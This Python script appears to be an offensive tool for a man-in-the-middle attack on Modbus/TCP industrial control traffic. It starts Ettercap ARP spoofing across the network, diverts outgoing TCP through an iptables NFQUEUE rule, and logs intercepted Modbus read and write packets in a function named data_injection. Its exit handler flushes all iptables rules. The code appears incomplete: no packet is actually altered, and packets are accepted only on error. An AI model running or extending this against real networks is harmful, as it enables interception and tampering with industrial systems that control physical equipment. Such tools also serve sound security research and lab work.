# -*- coding: UTF-8 -*- 
from scapy.all import *
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os, nmap
from scapy.contrib import modbus
from random import *
from time import *
from rich.console import Console
from rich.table import Table
from rich.markdown import Markdown
from rich.prompt import Prompt
from rich import inspect
from time import sleep
import threading

# -- GLOBAL VARIABLES -- #
my_ip = {}
mb_server = {}
mb_server['ip'] = '127.0.0.1'
mb_server['port'] = 502
mb_client = {}
mb_client['ip'] = '127.0.0.1'
mb_client['port'] = 502
# -- FUNCTION OPTIONS -- #
func_options = {
    'arp_mode': ['Ettercap', 'Scapy_Arpspoof'],
}
console = Console()

def get_ip():
    global mb_server, mb_client
    arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(mb_server['ip'])
    os.system(arp1)
    os.system('pkill -f ettercap')
    sleep(1)

def arp_spoofing():
    global mb_server, mb_client
    console.log(f"MB_server={mb_server['ip']}")
    console.log(f"MB_client={mb_client['ip']}")
    arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /// /// >/dev/null 2>&1 &'
    os.system(arp2)
    process = os.popen('pgrep -f ettercap')
    out = process.read()
    process.close()
    console.print("ettercap is running, PID : {}".format(out))
    console.log("ARPspoof_Mode = Ettercap is Ready!")

def process_packet(packet):
    try:
        z = IP(packet.get_payload())
        
        # 檢查是否為 Modbus/TCP 封包
        if z.haslayer(TCP):
            # console.log("Modbus/TCP Packet ...")
            func = z.payload.funcCode
            del z[TCP].chksum
            del z[IP].chksum
            del z[IP].len
            del z[TCP].len

            # 檢查封包長度和存在性
            if len(z[TCP].payload) > 0:
                if func == 15:  # Write Multiple Coils
                    if z[TCP].sport == 502:     # Server -> Client
                        console.print("GET Func_Code: 15_W_M_Coils Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 15_W_M_Coils Client -> Server ...")
                        z.show()
                elif func == 16:    # Write Multiple Holding Registers
                    if z[TCP].sport == 502:     # Server -> Client
                        console.print("GET Func_Code: 16_W_M_Holding_Reg Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 16_W_M_Holding_Reg Client -> Server ...")
                        z.show()
                elif func == 5: # Write Single Coil
                    if z[TCP].sport == 502:
                        console.print("GET Func_Code: 5_W_A_Coil Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 5_W_A_Coil Client -> Server ...")
                        z.show()
                elif func == 6:     # Write Single Holding Register
                    print("# GET Func_Code: 6 ...")
                    if z[TCP].sport == 502:
                        console.print("GET Func_Code: 6_W_A_Holding_Reg Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 6_W_A_Holding_Reg Client -> Server ...")
                        z.show()
                elif func == 3:    # Read Multiple Holding Registers
                    if z[TCP].sport == 502:
                        console.print("GET Func_Code: 3_R_M_Holding_Reg Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 3_R_M_Holding_Reg Client -> Server ...")
                        z.show()
                elif func == 4:    # Read Multiple Input Registers
                    if z[TCP].sport == 502:
                        console.print("GET Func_Code: 4_R_M_Input_Reg Server -> Client ...")
                        z.show()
                    elif z[TCP].dport == 502:
                        console.print("GET Func_Code: 4_R_M_Input_Reg Client -> Server ...")
                        z.show()

                    else:
                        pass
                else:
                    pass
            else:
                pass
        else:
            pass

    except Exception as e:
        # console.log(f"Error: {e}")
        packet.accept()

def data_injection():
    QUEUE_NUM = 0
    os.system("iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    queue = NetfilterQueue()
    try:
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush && iptables -t nat -F")
        print("........Exiting......")
        sleep(3)
    finally: 
        queue.unbind()

if __name__ == '__main__':
    # get_ip()
    if( Prompt.ask("START MODBUS_MITM?(y/n/?)", default='unknown') == 'y'):
        arp_spoofing()
        data_injection()
    else:
        console.log("Exiting ...")
        sleep(1)
        exit(0)
        